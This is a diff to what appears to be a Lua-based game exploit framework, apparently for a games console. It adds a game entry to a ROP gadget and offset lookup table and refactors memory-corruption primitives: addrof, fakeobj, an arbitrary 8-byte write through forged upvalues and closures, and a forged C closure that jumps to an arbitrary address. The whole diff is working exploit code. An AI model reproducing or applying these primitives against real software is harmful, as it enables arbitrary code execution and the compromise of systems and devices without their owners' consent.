@@ -152,10 +152,15 @@ function lua.resolve_game(luaB_auxwrap)
         libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
         gadgets = gadget_table.raspberry_cube.gadgets
     elseif game_name == "Aibeya" then
-        print("[+] Game identified as Aibeya/B/G")
+        print("[+] Game identified as Aibeya/G")
         eboot_addrofs = gadget_table.aibeya.eboot_addrofs
         libc_addrofs = gadget_table.aibeya.libc_addrofs
         gadgets = gadget_table.aibeya.gadgets
+    elseif game_name == "B" then
+        print("[+] Game identified as B")
+        eboot_addrofs = gadget_table.b.eboot_addrofs
+        libc_addrofs = gadget_table.b.libc_addrofs
+        gadgets = gadget_table.b.gadgets
     elseif game_name == "HamidashiCreative" then
         print("[+] Game identified as Hamidashi Creative")
         eboot_addrofs = gadget_table.hamidashi_creative.eboot_addrofs
@@ -289,6 +294,17 @@ function lua.addrof(obj)
     return lua.get_table_value(obj) or lua.addrof_trivial(obj)
 end
 
+function lua.resolve_value(v)
+    if type(v) == "string" then
+        return lua.addrof(v)+24
+    elseif type(v) == "number" then
+        return uint64(v)
+    elseif is_uint64(v) then
+        return v
+    end
+    errorf("lua.resolve_value: invalid type (%s)", type(v))
+end
+
 function lua.fakeobj(obj_addr, ttype)
     return lua.fake_table_value(obj_addr, ttype) or lua.fakeobj_through_closure(obj_addr, ttype)
 end
@@ -318,7 +334,7 @@ end
 -- write 8 bytes (double) at target address with 4 bytes corruption after addr+8
 function lua.write_double(addr, value)
     local fake_upval = ub8(0x0) .. ub8(0x0) .. ub8(addr)  -- next + tt/marked + addr to tvalue
-    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.addrof(fake_upval)+24)  -- env + proto + upvals
+    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.resolve_value(fake_upval))  -- env + proto + upvals
     lua.write_upval(fake_closure, value)
 end
 
@@ -333,7 +349,7 @@ end
 function lua.create_fake_cclosure(addr)
     -- next + tt/marked/isC/nupvalues/hole + gclist + env + f
     local fake_cclosure = ub8(0) .. "\6\0\1\0\0\0\0\0" .. ub8(0) .. ub8(0) .. ub8(addr)
-    return lua.fakeobj(lua.addrof(fake_cclosure)+24, lua_types.LUA_TFUNCTION)
+    return lua.fakeobj(lua.resolve_value(fake_cclosure), lua_types.LUA_TFUNCTION)
 end
 
 
